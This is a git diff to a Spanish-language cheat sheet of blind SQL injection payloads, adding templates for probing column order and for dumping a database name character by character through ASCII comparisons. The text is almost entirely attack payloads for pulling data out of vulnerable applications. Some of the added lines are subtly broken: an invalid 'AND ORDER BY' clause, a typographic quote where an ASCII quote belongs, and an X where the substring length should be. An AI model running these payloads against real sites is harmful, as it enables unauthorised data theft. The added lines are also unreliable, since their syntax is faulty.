@@ -15,11 +15,21 @@ En este caso buscamos un campo donde podamos validar una respuesta. Luego buscam
 
         <dato>' AND (select count(*) from users) > 0-- -
 
+##### otra opción
+
+        <dato>' AND ORDER BY <numero>
+
 ### Conseguir el length de un dato de la tabla
 
         <dato>' AND LEN(<campo a consultar del usuario>)=<length>-- -
 
+### Dumpear el nombre de una DB:
+
+        <dato>’ AND ASCII(SUBSTR(DATABASE(),<index>,X))=<Valor ASCII>
+
+        
 ### Dumpear los caracteres dentro de un campo
+
 Podemos trabajarlo con valores ASCII(en números del 32 al 127) y luego decodearlos para tener el caracter legible
 
         <dato>'+AND+ASCII(SUBSTRING(<campo>,<index_del_char>,1))=<valor ASCII>--+-
